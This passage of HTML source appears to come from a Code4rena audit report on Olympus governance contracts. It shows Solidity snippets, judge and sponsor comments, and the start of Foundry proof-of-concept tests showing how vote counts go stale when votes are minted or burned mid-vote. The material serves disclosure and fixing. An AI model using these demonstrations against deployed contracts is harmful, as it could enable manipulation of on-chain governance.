class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">totalEndorsementsForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">] * </span><span class=\"mtk7\">100</span><span class=\"mtk1\">) &lt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">ENDORSEMENT_THRESHOLD</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotEnoughEndorsementsToActivateProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposalHasBeenActivated</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalAlreadyActivated</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">activationTimestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">GRACE_PERIOD</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ActiveProposalNotExpired</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ActivatedProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposalHasBeenActivated</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalActivated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">vote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NoActiveProposalDetected</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">userVotesForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">UserAlreadyVoted</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">for_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">yesVotesForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">noVotesForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">userVotesForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WalletVoted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">for_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add time delay when activating a proposal, so that users can be aware of that and vote for the current one within the time window.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/273#issuecomment-1234872386\">fullyallocated (Olympus) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>This is a pretty unique edge case, I can acknowledge as QA.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/273#issuecomment-1249571276\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I actually don’t think its that unique in the case of on chain voting. Imagine a scenario where a user submits a vote with low gas amounts and it is not mined for days later and then the active proposal has changed.  I am not sure why the <code>vote</code> function wouldn’t take in the intended proposal ID. </p>\n<p>I am going to leave as medium severity as I do think this impacts the intended functionality of the protocol, but am willing to hear more from the sponsor on why they disagree.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-voted-votes-cannot-change-after-the-user-is-issued-new-votes-or-the-users-old-votes-are-revoked-during-voting\" style=\"position:relative;\"><a href=\"#m-10-voted-votes-cannot-change-after-the-user-is-issued-new-votes-or-the-users-old-votes-are-revoked-during-voting\" aria-label=\"m 10 voted votes cannot change after the user is issued new votes or the users old votes are revoked during voting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/275\">[M-10] Voted votes cannot change after the user is issued new votes or the user’s old votes are revoked during voting</a></h2>\n<p><em>Submitted by rbserver, also found by __141345__, cccz, csanuragjain, GalloDaSballo, Guardian, Lambda, m9800, and zzzitron</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48</a><br>\n<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56</a><br></p>\n<p>A user can call the following <code>vote</code> function to vote for a proposal. During voting, the voter admin can still call the <code>issueVotesTo</code> and <code>revokeVotesFrom</code> functions below to issue new votes or revoke old votes for the user, which also changes the votes’ total supply during the overall voting. Because each user can only call <code>vote</code> once for a proposal due to the <code>userVotesForProposal[activeProposal.proposalId][msg.sender] > 0</code> conditional check, the old voted votes, resulted from the <code>vote</code> call by the user, will be used to compare against the new total supply of the votes, resulted from the <code>issueVotesTo</code> and <code>revokeVotesFrom</code> calls during the overall voting, when determining whether the proposal can be executed or not. Because of this inconsistency, the result on whether the proposal can be executed might not be reliable.</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">vote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NoActiveProposalDetected</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">userVotesForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">UserAlreadyVoted</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">for_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">yesVotesForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">noVotesForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">userVotesForProposal</span><span class=\"mtk1\">[</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WalletVoted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">activeProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">for_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">userVotes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">issueVotesTo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;voter_admin&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Issue the votes in the VOTES module</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mintTo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">revokeVotesFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallet_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;voter_admin&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Revoke the votes in the VOTES module</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burnFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallet_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please add the following code in <code>src\\test\\policies\\Governance.t.sol</code>.</p>\n<p>First, please add the following code for <code>stdError</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">Test</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/Test.sol&quot;</span><span class=\"mtk1\">;    </span><span class=\"mtk3\">// @audit import stdError for testing purpose</span></span></span></code></pre>\n<p>Then, please append the following tests. These tests will pass to demonstrate the described scenarios.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testScenario_UserCannotVoteAgainWithNewlyMintedVotes</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_createActiveProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// voter3 votes for the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">yesVotesForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">noVotesForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">userVotesForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span 